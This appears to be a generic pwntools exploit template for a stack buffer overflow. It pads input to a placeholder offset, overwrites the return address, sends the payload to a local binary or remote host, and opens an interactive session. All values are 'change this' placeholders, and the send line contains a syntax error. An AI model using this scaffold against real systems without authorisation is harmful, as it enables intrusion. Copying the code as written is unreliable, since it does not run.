from pwn import *
import sys
import struct

offset = x                      #change this
return_address = p32(address)   #change this

conn = process("/binary")       #change this
#conn = remote('ip',port)       #change this
conn.recvuntil("prompt")        #change this
conn.send("A"*offset + return_address'\n')
conn.interactive()
